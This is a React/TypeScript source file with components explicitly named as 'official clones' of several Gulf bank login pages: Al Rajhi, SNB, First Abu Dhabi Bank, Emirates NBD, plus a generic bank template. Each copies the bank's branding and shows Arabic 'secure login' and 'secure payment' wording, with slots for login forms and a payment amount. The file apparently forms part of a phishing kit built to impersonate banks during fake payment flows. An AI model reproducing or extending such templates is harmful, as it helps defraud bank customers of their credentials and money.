import React from 'react';
import { Lock, Shield, User, Bell, Menu, Globe, ChevronRight } from 'lucide-react';

interface Bank {
  id: string;
  nameAr: string;
  nameEn: string;
  logo: string;
  color: string;
}

interface BankCloneProps {
  children: React.ReactNode;
  bank: Bank;
  amount?: string;
}

export const AlRajhiOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => (
  <div className="min-h-screen bg-[#F0F2F5] font-sans" dir="rtl">
    <header className="bg-[#0055A5] h-[72px] flex items-center justify-between px-6 shadow-lg sticky top-0 z-50">
      <img src={bank.logo} alt="Al Rajhi" className="h-10 brightness-0 invert" />
      <div className="flex items-center gap-3">
         <div className="bg-[#004282] text-white px-6 py-2 rounded-lg text-sm font-bold flex items-center gap-2">
           <Lock className="w-4 h-4" />
           <span>دخول آمن</span>
         </div>
      </div>
    </header>
    <main className="container mx-auto px-4 py-12 max-w-4xl">
      <div className="grid lg:grid-cols-12 gap-10">
        <div className="lg:col-span-7">
          <div className="bg-white rounded-[24px] shadow-2xl overflow-hidden border border-gray-100">
            <div className="bg-gradient-to-r from-[#0055A5] to-[#003B75] p-10 text-white">
              <h1 className="text-3xl font-black mb-2">مرحباً بك في المباشر</h1>
              <p className="opacity-70 text-sm">قم بتسجيل الدخول لإتمام عملية الدفع الآمنة</p>
            </div>
            <div className="p-10">{children}</div>
          </div>
        </div>
        <div className="lg:col-span-5 space-y-6">
          <div className="bg-white rounded-3xl p-8 border shadow-sm">
            <h3 className="font-black text-lg text-[#0055A5] mb-4 flex items-center gap-2"><Shield className="w-5 h-5" /> تنبيه أمني</h3>
            <p className="text-xs text-gray-500 leading-relaxed">مصرف الراجحي لن يطلب منك أبداً الإفصاح عن كلمة المرور أو رمز التفويض عبر الهاتف.</p>
          </div>
        </div>
      </div>
    </main>
  </div>
);

export const SNBOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => (
  <div className="min-h-screen bg-[#F4F7F6] font-sans" dir="rtl">
    <header className="bg-white h-[80px] border-b-4 border-[#006A4D] flex items-center justify-between px-10 shadow-sm sticky top-0 z-50">
      <img src={bank.logo} alt="SNB" className="h-12" />
      <div className="w-10 h-10 rounded-full bg-[#006A4D]/10 flex items-center justify-center text-[#006A4D]"><User className="w-5 h-5" /></div>
    </header>
    <main className="container mx-auto px-4 py-16 max-w-2xl">
      <div className="bg-white rounded-none shadow-2xl border-t-[6px] border-[#006A4D]">
        <div className="p-12">
          <div className="flex flex-col items-center mb-10">
            <div className="w-20 h-20 bg-[#006A4D]/5 rounded-full flex items-center justify-center mb-6"><Lock className="w-10 h-10 text-[#006A4D]" /></div>
            <h1 className="text-2xl font-black text-[#006A4D]">تسجيل الدخول الآمن</h1>
          </div>
          {children}
        </div>
      </div>
    </main>
  </div>
);

export const FABOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => (
  <div className="min-h-screen bg-white font-sans" dir="rtl">
    <header className="bg-white px-8 py-6 flex items-center justify-between border-b shadow-sm">
      <img src={bank.logo} alt="FAB" className="h-12" />
      <Globe className="text-[#E0004D] w-6 h-6" />
    </header>
    <main className="container mx-auto px-4 py-20 flex flex-col items-center">
      <div className="w-full max-w-md bg-white border-2 border-gray-100 rounded-none p-10 shadow-2xl">
        <h1 className="text-2xl font-bold text-[#E0004D] mb-8 text-center">Online Banking</h1>
        {children}
      </div>
    </main>
  </div>
);

export const ENBDOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => (
  <div className="min-h-screen bg-[#003D7A] font-sans" dir="rtl">
    <header className="px-10 py-8 flex items-center justify-between">
      <img src={bank.logo} alt="ENBD" className="h-10 brightness-0 invert" />
      <Menu className="text-white w-6 h-6" />
    </header>
    <main className="container mx-auto px-4 py-12 flex justify-center">
      <div className="w-full max-w-lg bg-white p-12 rounded-xl shadow-2xl">
        <h2 className="text-xl font-bold text-[#003D7A] mb-8">Login to Online Banking</h2>
        {children}
      </div>
    </main>
  </div>
);

export const GenericBankClone: React.FC<BankCloneProps> = ({ children, bank, amount }) => (
  <div className="min-h-screen bg-[#FAFAFA] font-sans" dir="rtl">
    <header className="bg-white border-b px-6 py-4 flex items-center justify-between sticky top-0 z-50 shadow-sm">
      <div className="flex items-center gap-4">
        <img src={bank.logo} alt={bank.nameAr} className="h-10" />
        <h2 className="text-lg font-bold" style={{ color: bank.color }}>{bank.nameAr}</h2>
      </div>
      <div className="text-xs font-bold text-gray-400 bg-gray-50 px-4 py-2 rounded-full border flex items-center gap-2">
        <Lock className="w-3.5 h-3.5" /><span>Secure Encryption</span>
      </div>
    </header>
    <main className="container mx-auto px-4 py-12 max-w-xl">
      <div className="bg-white rounded-3xl shadow-xl overflow-hidden border">
        <div className="p-8 border-b bg-gray-50/50">
           <h1 className="text-xl font-black">الدخول البنكي الآمن</h1>
           {amount && <p className="text-lg font-black mt-2" style={{ color: bank.color }}>{amount}</p>}
        </div>
        <div className="p-8">{children}</div>
      </div>
    </main>
  </div>
);
